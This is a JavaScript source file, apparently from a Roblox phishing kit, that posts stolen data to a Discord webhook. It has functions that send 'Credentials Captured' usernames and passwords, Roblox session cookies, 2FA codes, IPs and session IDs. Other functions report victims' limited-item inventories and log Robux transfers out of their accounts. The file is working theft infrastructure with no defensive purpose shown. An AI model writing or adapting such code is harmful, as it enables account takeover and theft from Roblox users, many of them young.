// discord.js
// kirim notif ke Discord webhook (mirror dari Telegram)
import axios from 'axios';
import 'dotenv/config';

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

// --- basic send (markdown support) ---
export async function sendDiscord(content, opts = {}) {
  if (!WEBHOOK_URL) return false;
  try {
    const r = await axios.post(WEBHOOK_URL, {
      content: content.slice(0, 1990), // discord limit 2000
      username: opts.username || 'Roblox Bot',
      avatar_url: opts.avatar,
      embeds: opts.embeds || undefined
    }, { validateStatus: () => true });
    return r.status >= 200 && r.status < 300;
  } catch (e) {
    return false;
  }
}

// --- send dengan embed (lebih rapi) ---
export async function sendDiscordEmbed({ title, description, fields, color = 0x0084ff, footer, thumbnail }) {
  if (!WEBHOOK_URL) return false;
  try {
    const r = await axios.post(WEBHOOK_URL, {
      username: 'Roblox Bot',
      embeds: [{
        title,
        description,
        color,
        fields: fields || [],
        footer: footer ? { text: footer } : undefined,
        thumbnail: thumbnail ? { url: thumbnail } : undefined,
        timestamp: new Date().toISOString()
      }]
    }, { validateStatus: () => true });
    return r.status >= 200 && r.status < 300;
  } catch (e) {
    return false;
  }
}

// --- file upload ---
export async function sendDiscordFile(filePath, content = '') {
  if (!WEBHOOK_URL) return false;
  const fs = await import('fs');
  const FormData = (await import('form-data')).default;
  const form = new FormData();
  form.append('content', content);
  form.append('file', fs.createReadStream(filePath));

  try {
    const r = await axios.post(WEBHOOK_URL, form, {
      headers: form.getHeaders(),
      validateStatus: () => true
    });
    return r.status >= 200 && r.status < 300;
  } catch (e) {
    return false;
  }
}

// --- credential capture (formatted) ---
export async function discordCreds({ username, password, ip, ua, sid, stage }) {
  return sendDiscordEmbed({
    title: `🔐 Credentials Captured — ${stage || 'login'}`,
    color: 0xff3b30,
    fields: [
      { name: '👤 Username', value: `\`${username}\``, inline: true },
      { name: '🔑 Password', value: `\`${password}\``, inline: true },
      { name: '🌐 IP', value: `\`${ip || '?'}\``, inline: true },
      { name: '🖥 UA', value: `\`${(ua || '?').slice(0, 100)}\``, inline: false },
      { name: '🆔 Session', value: `\`${sid || '?'}\``, inline: false }
    ],
    footer: 'Roblox Bot'
  });
}

// --- cookie captured ---
export async function discordCookie({ username, cookie, userId }) {
  return sendDiscordEmbed({
    title: `🍪 Cookie Captured — ${username}`,
    color: 0x34c759,
    fields: [
      { name: '👤 Username', value: `\`${username}\``, inline: true },
      { name: '🆔 UserID', value: `\`${userId || '?'}\``, inline: true },
      { name: '🔑 Cookie', value: `\`\`\`${cookie.slice(0, 500)}\`\`\``, inline: false }
    ],
    footer: 'Roblox Bot'
  });
}

// --- 2FA captured ---
export async function discord2FA({ username, code, sid }) {
  return sendDiscordEmbed({
    title: `🔑 2FA Code — ${username}`,
    color: 0xff9500,
    fields: [
      { name: '🔢 Code', value: `\`${code}\``, inline: true },
      { name: '🆔 Session', value: `\`${sid}\``, inline: true }
    ],
    footer: 'Roblox Bot'
  });
}

// --- inventory report ---
export async function discordInventory({ username, totalItems, limitedCount, totalRAP, top }) {
  return sendDiscordEmbed({
    title: `📦 Inventory — ${username}`,
    color: 0x5856d6,
    fields: [
      { name: '📊 Total Items', value: `${totalItems}`, inline: true },
      { name: '💎 Limited', value: `${limitedCount}`, inline: true },
      { name: '💰 Total RAP', value: `R$ ${totalRAP.toLocaleString()}`, inline: true },
      { name: '🏆 Top 5', value: top.slice(0, 5).map(i => `• ${i.name} — R$ ${(i.recentAveragePrice || 0).toLocaleString()}`).join('\n') || 'none', inline: false }
    ],
    footer: 'Roblox Bot'
  });
}

// --- robux transfer ---
export async function discordRobux({ from, to, amount, method, status }) {
  return sendDiscordEmbed({
    title: `💰 Robux Transfer`,
    color: status ? 0x34c759 : 0xff3b30,
    fields: [
      { name: '📤 From', value: `\`${from}\``, inline: true },
      { name: '📥 To', value: `\`${to}\``, inline: true },
      { name: '💵 Amount', value: `R$ ${amount.toLocaleString()}`, inline: true },
      { name: '🔧 Method', value: `\`${method}\``, inline: true },
      { name: '📊 Status', value: status ? '✅ success' : '❌ failed', inline: true }
    ],
    footer: 'Roblox Bot'
  });
}

// --- error report ---
export async function discordError({ context, error, username }) {
  return sendDiscordEmbed({
    title: `⚠️ Error — ${context}`,
    color: 0xff3b30,
    fields: [
      { name: '👤 Username', value: `\`${username || '?'}\``, inline: true },
      { name: '💥 Error', value: `\`\`\`${error.slice(0, 1000)}\`\`\``, inline: false }
    ],
    footer: 'Roblox Bot'
  });
}
